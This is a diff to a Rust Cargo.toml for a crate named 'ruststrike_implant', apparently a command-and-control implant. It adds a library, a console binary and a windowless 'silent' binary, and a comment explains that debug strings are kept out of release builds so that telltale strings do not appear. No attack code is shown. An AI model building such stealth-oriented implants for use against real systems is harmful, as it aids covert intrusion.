@@ -5,6 +5,18 @@ edition.workspace = true
 license.workspace = true
 build = "build.rs"
 
+[lib]
+name = "ruststrike_implant"
+path = "src/lib.rs"
+
+[[bin]]
+name = "ruststrike-implant"
+path = "src/main.rs"
+
+[[bin]]
+name = "ruststrike-implant-silent"
+path = "src/bin/silent.rs"
+
 [dependencies]
 anyhow = { workspace = true }
 serde_json = { workspace = true }
@@ -18,5 +30,8 @@ winres = "0.1"
 [features]
 default = []
 # Re-enables the [implant] ... debug eprintln! logs (compiled out by default so
-# the telltale strings never make it into the release binary). Dev only.
+# the telltale strings never make it into the release binary). Dev only. In the
+# silent (GUI-subsystem) bin these have no console to write to — use the
+# console bin for verbose debugging.
 verbose = []
+
